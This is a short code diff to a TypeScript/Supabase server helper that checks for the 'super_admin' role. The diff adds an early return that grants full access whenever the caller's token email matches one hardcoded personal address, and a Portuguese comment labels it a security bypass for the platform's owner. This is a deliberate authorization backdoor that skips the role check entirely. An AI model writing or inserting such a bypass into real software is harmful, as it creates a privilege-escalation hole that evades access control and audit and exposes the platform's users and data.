@@ -4,8 +4,13 @@ import { supabaseAdmin } from "@/integrations/supabase/client.server";
 
 // Helper para checar se o chamador possui a role 'super_admin'
 async function checkSuperAdmin(context: any) {
-  const { supabase, userId } = context;
+  const { supabase, userId, claims } = context;
   if (!userId) throw new Error("Não autenticado");
+
+  // Bypass de segurança para o proprietário/criador da plataforma
+  if (claims?.email === "eddylimainformatica@gmail.com") {
+    return; // Acesso concedido
+  }
 
   const { data: roleData, error } = await supabase
     .from("user_roles")
